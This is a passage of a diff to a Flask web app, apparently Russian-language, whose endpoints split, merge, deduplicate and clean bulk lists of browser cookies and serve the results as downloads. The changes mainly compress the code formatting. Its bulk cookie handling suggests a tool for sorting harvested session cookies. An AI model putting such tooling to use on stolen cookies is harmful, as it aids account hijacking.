+    return jsonify({"success": True, "total_files": len(files), "total_cookies": len(all_lines), "duplicates_removed": total_orig - len(all_lines), "download_url": f"/downloads/{filename}"})
 
 @app.route("/api/split-cookies", methods=["POST"])
 def api_split_cookies():
@@ -1191,27 +1008,19 @@ def api_split_cookies():
     content = data.get("content", "")
     split_type = data.get("split_type", "count")
     count = data.get("count", 100)
-    
-    if not content:
-        return jsonify({"success": False, "message": "Нет данных"})
-    
+    if not content: return jsonify({"success": False, "message": "Нет данных"})
     files = split_cookies_by_count(content, count) if split_type == "count" else split_cookies_by_files(content, count)
-    if not files:
-        return jsonify({"success": False, "message": "Не удалось разделить"})
-    
+    if not files: return jsonify({"success": False, "message": "Не удалось разделить"})
     zip_buffer = BytesIO()
     with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
         for i, fc in enumerate(files, 1):
             cnt = len([l for l in fc.split('\n') if l])
             zf.writestr(f"part_{i}_{cnt}cookies.txt", fc)
     zip_buffer.seek(0)
-    
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     archive_name = f"split_{timestamp}.zip"
     filepath = os.path.join("downloads", archive_name)
-    with open(filepath, 'wb') as f:
-        f.write(zip_buffer.getvalue())
-    
+    with open(filepath, 'wb') as f: f.write(zip_buffer.getvalue())
     total = sum(len([l for l in file.split('\n') if l]) for file in files)
     return jsonify({"success": True, "file_count": len(files), "total_cookies": total, "download_url": f"/downloads/{archive_name}"})
 
@@ -1220,26 +1029,15 @@ def api_clean_cookies():
     data = request.json or {}
     content = data.get("content", "")
     action = data.get("action", "deduplicate")
-    
-    if not content:
-        return jsonify({"success": False, "message": "Нет данных"})
-    
+    if not content: return jsonify({"success": False, "message": "Нет данных"})
     orig_lines = [l for l in content.split('\n') if l.strip()]
     processed = remove_duplicates(content) if action == "deduplicate" else clean_cookies(content)
     proc_lines = [l for l in processed.split('\n') if l.strip()]
-    
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     filename = f"cleaned_{timestamp}.txt"
     filepath = os.path.join("downloads", filename)
-    with open(filepath, 'w', encoding='utf-8') as f:
-        f.write(processed)
-    
-    return jsonify({
-        "success": True, "original_count": len(orig_lines),
-        "processed_count": len(proc_lines),
-        "duplicates_removed": len(orig_lines) - len(proc_lines),
-        "download_url": f"/downloads/{filename}"
-    })
+    with open(filepath, 'w', encoding='utf-8') as f: f.write(processed)
+    return jsonify({"success": True, "original_count": len(orig_lines), "processed_count": len(proc_lines), "duplicates_removed": len(orig_lines) - len(proc_lines), "download_url": f"/downloads/{filename}"})
 
 @app.route("/downloads/<filename>")
 def download_file(filename):
